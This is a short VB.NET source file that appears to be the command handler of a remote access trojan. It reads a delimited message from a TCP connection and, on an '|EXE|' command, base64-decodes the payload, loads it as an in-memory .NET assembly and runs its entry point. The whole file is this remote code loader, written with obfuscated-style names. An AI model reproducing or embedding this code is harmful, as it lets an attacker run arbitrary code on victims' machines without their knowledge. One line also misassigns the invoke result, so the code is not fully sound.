Imports System.Net.Sockets
Imports System.Reflection

Public Class MainCL
    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
        Dim h As String() = Split(l, "|SP2|")

        If h(1) = "|EXE|" Then

            Await Task.Run(Sub() Launch(h(2)))



        End If
    End Sub
    Public Shared Async Sub Launch(ByVal i As String)
        Dim b As Byte() = Await ConvertBack(i)

        Dim aze As Assembly = Assembly.Load(b).EntryPoint.Invoke(Nothing, Nothing)

    End Sub



    Public Shared Async Function ConvertBack(ByVal k As String) As Task(Of Byte())
        Return Await Task.Run(Function() Convert.FromBase64String(k))
    End Function
End Class
